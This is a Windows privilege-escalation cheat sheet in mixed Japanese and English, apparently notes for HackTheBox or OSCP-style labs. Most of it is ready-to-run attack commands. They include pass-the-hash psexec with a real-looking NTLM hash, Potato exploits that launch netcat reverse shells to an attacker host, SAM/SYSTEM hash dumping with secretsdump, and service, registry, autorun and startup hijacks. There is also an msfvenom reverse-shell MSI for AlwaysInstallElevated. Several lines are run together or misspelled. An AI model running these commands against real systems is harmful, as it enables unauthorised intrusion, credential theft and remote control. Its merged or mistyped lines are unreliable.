### psexec
impacket-psexec -hashes :32693b11e6aa90eb43d32c72a07ceea6 htb/administrator@10.10.10.161 powershell.exe

### Juicy Potate
Juicy PotateはWindowsのローカル特権昇格ツールです。
https://github.com/ohpe/juicy-potato

setImpersonatePrivilegeが有効になっているため、 Juicy Potatoを使用して SYSTEM を取得できる可能性が非常に高くなります。
Juicy Potato は、Microsoft がトークンを処理する方法を悪用して、ローカル権限を SYSTEM に昇格させます。

### Automated Scripts
winpeas.exe
winpeas.bat
Jaws-enum.ps1
powerup.ps1
PrivescCheck.ps1

### Token Impersonation

Command to check whoami /priv
#PrintspooferPrintSpoofer.exe -i -c powershell.exe 
PrintSpoofer.exe -c "nc.exe <lhost> <lport> -e cmd"
#RoguePotatoRoguePotato.exe -r <AttackerIP>-e "shell.exe"-l 9999
#GodPotatoGodPotato.exe -cmd "cmd /c whoami"GodPotato.exe -cmd "shell.exe"#JuicyPotatoNGJuicyPotatoNG.exe -t *-p "shell.exe"-a

#SharpEfsPotatoSharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"#writes whoami command to w.log file

### SAM and SYSTEM
次のフォルダーをチェックする
#Usually %SYSTEMROOT% = C:\Windows%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
C:\windows.old
#正規表現、最初にc:dir / s SAMに移動します
dir /s システム

	• SYSTEMおよびSAMからのハッシュの取得
impacket-secretsdump -system SYSTEM -sam SAM local
#コマンドで常にlocalに言及する
#これで、ハッシュの詳細なリストが表示されます
### Services
#### Binary Hijacking
#winpeas からサービスを識別する
icalcs "path" 
#Fは完全な権限を意味し、フォルダへのフルアクセスがあることを確認する必要がありますsc qc <servicename>
 #BinaryPath 変数の検索
sc config <service> <option>="<value>" #change the path to the reverseshell location
sc start <servicename>
---
#### Unquoted Service Path
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """  #Displays services which has missing quotes, this can slo be obtained by running WinPEAS
#書き込み可能なパスを確認する
icalcs "path"
#ペイロードを書き込み可能な場所に挿入し、どちらが機能しますか。sc start <servicename>
---
#### Insecure Service Executables
#Winpeas で、次のサービスを探します
File Permissions: Everyone [AllAccess]
#サービスフォルダ内の実行可能ファイルを置き換えて、サービスを開始しますsc start <service>
---
#### Weak Registry permissions
#Winpeas services info の出力で次の点を探します
HKLM\system\currentcontrolset\services\<service> (Interactive [FullControl]) #This means we have ful access

accesschk /acceptula -uvwqk <path of registry> #Check for KEY_ALL_ACCESS

#regeditからのサービス情報、実行可能ファイルを保持する変数を識別しますreg query <reg-path>

reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
#ここでは Imagepath が変数です
net start <service>


### Schedules Tasks
schtasks /query /fo LIST /v 
#スケジュールされたタスクのリストを表示し、関心のあるタスクをピックアップします
#権限チェック - 書き込み可能とは、悪用可能であることを意味します。
icalcs "path"
#スケジュールされたタスクが実行されるまで待つと、シェルが表示されます
### DLL Hijacking
### Autorun
#確認のために、ファイルの場所を含むいくつかの情報が表示されます
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run

#場所が書き込み可能であることを確認する
accesschk.exe \accepteula -wvu "<path>" #returns FILE_ALL_ACCESS

#実行可能ファイルをリバースシェルに置き換えると、管理者ログインまで待つ必要があり、シェルが作成されます


### AlwaysInstallElevated
#チェックのために、1またはOx1を返す必要があります
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

#msi 形式でのリバースシェルの作成
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<port> --platform windows -f msi > reverse.msi

#シェルの実行と取得
msiexec /quiet /qn /i reverse.msi

### Startup Apps
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp 
#スタートアップ アプリケーションについては、こちらを参照してください。
#書き込み可能な権限と転送を確認する
#ここでの唯一の落とし穴は、システムを再起動する必要があることです

### Insecure GUI apps
#Check the applications that are running from "TaskManager" and obtain list of applications that are running as Privileged user
#Open that particular application, using "open" feature enter the following
file://c:/windows/system32/cmd.exe 



